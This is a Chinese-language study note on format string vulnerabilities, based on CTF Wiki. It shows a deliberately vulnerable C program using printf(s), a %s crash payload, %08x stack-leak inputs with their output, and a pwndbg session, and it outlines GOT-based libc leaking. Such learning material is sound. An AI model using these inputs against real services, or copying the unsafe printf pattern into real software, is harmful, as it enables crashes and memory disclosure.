# 学习CTF Wiki格式化字符串漏洞


> 传送门：[CTF Wiki: Linux Pwn](https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/)


- [y] [Format String Vulnerability](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/):

## 案例及利用
格式化字符串漏洞的两个利用手段：

- 通过 `%s` 对应的参数地址不合法的概率比较大来使程序崩溃

- 查看进程内容，根据 `%d`，`%f` 输出了栈上的内容

### 程序崩溃

通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，因为我们只需要输入若干个 %s 即可
```text
%s%s%s%s%s%s%s%s%s%s%s%s%s%s
```

**原理：栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。这一利用，虽然攻击者本身似乎并不能控制程序，但是这样却可以造成程序不可用。例如某远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。 **

### 泄露内存

例如格式化字符串漏洞泄露内存，如：
	* 泄露栈内存
		* 获取某个变量的值
		* 获取某个变量对应地址的内存
	* 泄露任意地址内存
		* 利用 GOT 表得到 `libc` 函数地址，进而获取 `libc`，进而获取其它 `libc` 函数地址
		* 盲打，`dump` 整个程序，获取有用信息

#### 泄露栈内存

```C
#include <stdio.h>
int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
// gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
```

#### 获取栈变量数值

利用格式化字符串来获取栈上变量的数值：

```bash
# zhailin @ DESKTOP-4OQQP8F in ~/Pwns/fmtstr-Exploit [18:21:18]
$ ./leakmemory
%08x.%08x.%08x
00000001.22222222.ffffffff.%08x.%08x.%08x
ffeddcb0.f7f1a7b0.0804919d%      
```

再用GDB调试验证我们的想法：

```bash
pwndbg> b printf
Breakpoint 1 at 0x8049050
pwndbg> r
Starting program: /home/zhailin/Pwns/fmtstr-Exploit/leakmemory
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
%08x.%08x.%08x

LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────
 EAX  0x804a00b ◂— '%08x.%08x.%08x.%s\n'
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf14 (_DYNAMIC) ◂— 1
 ECX  0xf7f22380 (_nl_C_LC_CTYPE_class+256) ◂— 0x20002
 EDX  0
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffcfb4 —▸ 0xffffd122 ◂— '/home/zhailin/Pwns/fmtstr-Exploit/leakmemory'
 EBP  0xffffcee8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0
 ESP  0xffffce4c —▸ 0x80491ea (main+100) ◂— add esp, 0x20
 EIP  0xf7dd5a90 (printf) ◂— endbr32
───────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────────────────
 ► 0xf7dd5a90 <printf>       endbr32
   0xf7dd5a94 <printf+4>     call   __x86.get_pc_thunk.ax       <__x86.get_pc_thunk.ax>

   0xf7dd5a99 <printf+9>     add    eax, 0x1d2567
   0xf7dd5a9e <printf+14>    sub    esp, 0xc
   0xf7dd5aa1 <printf+17>    lea    edx, [esp + 0x14]
   0xf7dd5aa5 <printf+21>    push   0
   0xf7dd5aa7 <printf+23>    push   edx
   0xf7dd5aa8 <printf+24>    push   dword ptr [esp + 0x18]
   0xf7dd5aac <printf+28>    mov    eax, dword ptr [eax - 0x11c]
   0xf7dd5ab2 <printf+34>    push   dword ptr [eax]
   0xf7dd5ab4 <printf+36>    call   __vfprintf_internal         <__vfprintf_internal>
───────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────
00:0000│ esp 0xffffce4c —▸ 0x80491ea (main+100) ◂— add esp, 0x20
01:0004│-098 0xffffce50 —▸ 0x804a00b ◂— '%08x.%08x.%08x.%s\n'
02:0008│-094 0xffffce54 ◂— 1
03:000c│-090 0xffffce58 ◂— 0x22222222 ('""""')
04:0010│-08c 0xffffce5c ◂— 0xffffffff
05:0014│-088 0xffffce60 —▸ 0xffffce70 ◂— '%08x.%08x.%08x'
06:0018│-084 0xffffce64 —▸ 0xffffce70 ◂— '%08x.%08x.%08x'
07:001c│-080 0xffffce68 —▸ 0xf7fbe7b0 —▸ 0x80482c2 ◂— 'GLIBC_2.34'
─────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────
 ► 0 0xf7dd5a90 printf
   1 0x80491ea main+100
   2 0xf7d9f519 __libc_start_call_main+121
   3 0xf7d9f5f3 __libc_start_main+147
   4 0x804909c _start+44
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

此时程序断在第一次调用`printf`的位置


## 总结

    * 格式化字符串漏洞的本质在于信任了用户的输入, 攻击者通过输入构造好的格式化字符串来泄露栈上的内存数据.
        * 若干个`%s`用于利用格式化字符串漏洞使程序崩溃.
        * `%x`或`%p`用于泄露栈内存数据.
        * `%n$x`用于泄露输出函数的第`n+1`个参数. 这里的`n`是相对于格式化字符串而言的.